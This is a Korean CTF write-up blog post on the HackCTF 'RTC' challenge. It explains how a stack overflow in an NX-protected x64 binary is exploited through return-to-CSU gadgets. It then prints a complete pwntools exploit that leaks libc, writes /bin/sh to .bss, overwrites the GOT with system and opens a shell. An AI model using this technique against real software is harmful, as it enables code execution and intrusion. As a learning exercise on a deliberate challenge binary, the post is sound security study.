---
layout: post
title:  "HacCTF RTC write-up"
date:   2020-03-18 19:45:55
image:  hackctf_rtc.PNG
tags:   [HackCTF]
categories: [Write-up]
---
# [HackCTF] RTC

Date: Mar 18, 2020
Tags: report

### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTC/Untitled.png)

NX 비트가 걸려있다. 이 문제 역시 GOT overwrite가 가능할것이다

<br>

**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTC/Untitled%201.png)

또 ROP문제인 것 같다. 주저하지 말고 바로 코드를 확인해보자

<br>

**3) 코드 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTC/Untitled%202.png)

write함수로 문자열을 출력시키고 read로 입력을 받고 바로 종료된다.

read함수에서 0x200 만큼 입력을 받으므로 ret를 덮을수 있다. 그렇다면 인자를 처리해줄 적당한 가젯을 찾아서 ROP를 진행하면 될것같다

<br><br>

### 2. 접근방법

---

write 함수를 이용하여 write libc 주소를 leak하고, read함수를 이용하여 /bin/sh를 고정주소에 박아놓고 ROP를 진행하면 된다.

하지만 write나 read 함수를 이용하려면 pop rdi, pop rsi, pop rdx 가젯을 이용하여 인자를 처리해야하는데 이러한 가젯은 현재 바이너리에 존재하지 않는다. 따라서 제목처럼 RTC(Return To CSU)를 이용해야 한다.

- RTC란?

    바이너리가 실행되면 main이 바로 실행되는것이 아니라 그전에 내부적으로 실행되는 동작이 있다.

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTC/Untitled%203.png)

    다음과 같이 _start → __libc_start_main → __libc_csu_init .. → main 의 과정을 거쳐서 실제 main이 실행되는 것이다. 우리가 볼 부분은 __libc_csu_init 함수부분이다.

     

- **__libc_csu_init**

    해당 함수를 어셈블리로 확인해보면 다음과 같다

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTC/Untitled%204.png)

    요 부분이 중요하다. 다이렉트로 pop rdi 같은 가젯은 없지만, 간접적으로 rdi, rsi, rdx에 값을 위 부분을 이용하여 저장할수 있다. 우선 +90 라인부터 확인해보자.

    1. **gadget_1**

        첫번째로 사용할 가젯 부분은 0x4006ba(+90 ~ +100)부분이다. 스택에 저장되있는 값을 pop하여 rbx, rbp, r12, r13, r14, r15에 저장한다.

    2. **gadget_2**  

        두번째로 사용할 가젯 부분은 0x4006a0 부분이다. 

        - r13에 저장된 값을 rdx에 복사한다.
        - r14에 저장된 값을 rsi에 복사한다.
        - r15d에 저장된 값을 edi에 복사한다.

        우리는 이를 이용해서 edi, rsi, rdx 인자를 활용할 수 있다. 비록 rdi는 다 사용못하고 edi만 사용 가능하지만, 어짜피 우리가 사용하려는 rdi 8바이트이내의 값이므로 edi로 충분하다.

        그리고 rdx, rsi, edi에 값을 복사하고 call [r12 + rbx*8] 이 호출된다. 우리는 이 부분을 이용해서 원하는 함수를 호출할 수 있다.

        예를 들어 현재 가장 먼저 해야할 것은 write libc의 주소를 leak해야한다. 

        1) main의 read에서 bof를 이용하여 gadget_1의 주소로 ret하게 만든다.

        2) write함수 주소 leak을 위한 3개의 인자가 r13, r14, r15에 저장된다

        3) 그다음 ret를 gadget_2로 하게 만든다

        4) rdx, rsi, edi에 값이 복사되고 call [r12 + rbx*8]  을 이용하여 write함수를 호출한다

        자. 그럼 위 4번인 write함수를 호출하게 하려면 rbx와 r12에는 어떠한 값을 넣어야 할까?

        call [write_got] ⇒ 이것이 우리가 원하는 동작이므로, rbx에는 0이 들어가야하고, r12에는 write_got가 들어가야한다. 이렇게 하면 write함수가 딱 호출된다!

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTC/Untitled%205.png)

        그럼이제 write함수가 호출되어 libc 주소가 leak되었다고 해보자.

        우리는 이 libc된 주소를 이용하여 libc_base주소를 얻을수 있고, 이를 이용하여 system함수를 실행시켜야 한다. 

        그럼 우선 고정주소에 /bin/sh를 먼져 넣어야 한다.  write함수가 현재 호출되었는데,  또 다른 함수를 실행시키려면 어떻게 해야할까?

        gadget_2을 보면 call [r12+rbx*8]이 호출되고 rbx에 0x1을 더한뒤, rbx와 rbp를 비교한다.

        두 개의 값이 같지 않으면 gadget_2(__libc_csu_init+64)로 돌아가고 같으면 다음 라인이 진행된다. 아래 사진을 다시 봐보자

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTC/Untitled%204.png)

        인자를 수정할수 있는 부분은 gadet_1부분이다. 여기서 레지스터에 들어간 값을 gaget_2에서 복사하기 때문이다. +81에서 rbp와 rbx가 같으면 add rsp,0x8을 거쳐 다시 gadget_1로 돌아올수 있다.

        따라서 초기에 gadget_1이 수행될때 rbp에 1을 넣으면 gadget_2이 수행되어 cmp를 통과할 수 있다. 이렇게 우리는 계속해서 원하는 함수를 원하는 인자를 넣어 호출할 수 있다.

         

    - 시나리오

        방법을 다 익혔으니, 이제 시나리오를 짜보자.

        1. write libc주소 leak하여 libc_base 주소 얻기
        2. .bss 영역에 read함수를 이용하여 /bin/sh 문자열 넣기
        3. .bss + 8 영역에 read함수를 이용하여 main주소 넣기
        4. main의 read를 bof다시 일으키기
        5. 1번에서 구한 libc_base 주소를 이용하여 read함수를 통해 read_got에 system함수 넣기
        6. system함수 실행

    (각각의 원하는 함수호출을 위한 인자 세팅은 당연히 다 해줘야함.)

<br><br>

### 3. 풀이

---

최종 익스코드는 다음과 같다

    from pwn import *
    context.log_level="DEBUG"
    p=remote("ctf.j0n9hyun.xyz", 3025)
    env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
    #p=process("./rtc",env=env)
    e=ELF("./rtc")
    libc=ELF("./libc.so.6")
    #gdb.attach(p)
    
    p.recvuntil("\n")
    
    # need value
    write_plt=e.plt['write']
    read_got=e.got['read']
    write_got=e.got['write']
    bss_addr=0x601050+0x900
    gadget_1=p64(0x4006ba) # pop rbx,rbp,r12,r13,r14,r15, ret;
    gadget_2=p64(0x4006a0) # mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+8*rbx]; 
    		       # add rbx,1; cmp rbx,rbp
    
    # setting for write(1,write_got,8)
    payload="A"*0x48
    payload+=gadget_1
    payload+=p64(0) #rbx
    payload+=p64(1) #rbp
    payload+=p64(write_got) #r12
    payload+=p64(8) #r13
    payload+=p64(write_got)  #r14
    payload+=p64(1) #r15
    
    # call write(1,write_got,8) => leak write libc addr
    payload+=gadget_2
    
    # setting for read(0,bss_addr,16)
    payload+=p64(0) 
    payload+=p64(0) #rbx
    payload+=p64(1) #rbp
    payload+=p64(read_got) #r12
    payload+=p64(16) #r13
    payload+=p64(bss_addr)  #r14
    payload+=p64(0) #r15
    
    # call read(0,bss)addr,16)
    payload+=gadget_2
    
    # setting for main()
    payload+=p64(0) 
    payload+=p64(0) #rbx
    payload+=p64(1) #rbp
    payload+=p64(bss_addr+8) #r12
    payload+=p64(0) #r13
    payload+=p64(0)  #r14
    payload+=p64(0) #r15
    
    # call main()
    payload+=gadget_2
    payload+=p64(0)
    payload+=p64(0) #rbx
    payload+=p64(1) #rbp
    
    pause()
    p.send(payload)
    libc_base=u64(p.recv(6).ljust(8,"\x00"))-libc.symbols['write']
    log.info("libc_base::"+hex(libc_base))
    system_base=p64(libc_base+libc.symbols['system'])
    bin_sh="/bin/sh\x00"+p64(0x4005F6)
    p.send(bin_sh)
    
    #--------------finish libc_leak, insert /bin/sh and main_addr  in bss~ bss+8---------
    
    
    # setting read(0,write_got_addr,8)
    payload2="A"*0x48
    payload2+=gadget_1
    payload2+=p64(0) #rbx
    payload2+=p64(1) #rbp
    payload2+=p64(read_got) #r12
    payload2+=p64(8) #r13
    payload2+=p64(write_got)  #r14
    payload2+=p64(0) #r15
    
    # call read(0,write_got_addr,8)
    payload2+=gadget_2
    
    # setting system(bss_addr)
    payload2+=p64(0) 
    payload2+=p64(0) #rbx
    payload2+=p64(1) #rbp
    payload2+=p64(write_got) #r12
    payload2+=p64(8) #r13
    payload2+=p64(0)  #r14
    payload2+=p64(bss_addr) #r15
    
    # call system(bss_addr)
    
    payload2+=gadget_2
    pause()
    p.send(payload2)
    sleep(1)
    pause()
    p.sendline(system_base)
    
    p.interactive()
    #payload+=gadget_2
    #payload+=

<br><br>

### 4. 몰랐던 개념

---

사실 __libc_csu_init 동작원리는 몰라도 되고 여기에 존재하는 가젯을 이용만 잘 하면 되는 문제다.

요 앞에 한 5개 정도 다 ROP 문제였는데, 기본 ROP 부터, 상황이 조금씩 달라지는 문제들이 나왔다.

결론은 x64에서는 가젯을 처리하는 것이 관건이기 때문에 RTC를 이용하는 방법과 syscall을 이용하는 ROP 방법을 방법을 새로 알게 되었다.

<br><br>